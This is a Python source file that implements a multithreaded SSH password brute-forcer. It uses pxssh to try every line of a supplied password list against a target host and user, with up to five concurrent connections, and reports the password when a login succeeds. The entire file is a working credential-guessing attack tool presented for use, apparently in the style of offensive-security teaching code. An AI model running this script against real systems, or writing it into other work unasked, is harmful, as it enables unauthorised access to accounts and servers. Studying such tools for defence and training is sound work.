from __future__ import print_function
import pxssh
import optparse
import time
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
found = False
fails = 0
def connect(host, user, pw, release):
    global found
    global fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, pw)
        print('[+] Password found: ' + pw)
        found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, pw, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, pw, False)
    finally:
        if release: connection_lock.release()
def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password-list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passFile = options.passwdFile
    user = options.user
    if host == None or passFile == None or user == None:
        print(parser.usage)
        exit(0)
    fn = open(passFile, 'r')
    for line in fn.readlines():
        if found:
            print("[*] Exiting: Password found")
            exit(0)
        if fails > 5:
            print("[!] Exiting: Too Many SOcket Timeouts")
            exit(0)
        connection_lock.acquire()
        password = line.strip("\r").strip("\n")
        print("[-] Testing: " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()
if __name__ == '__main__':
    main()
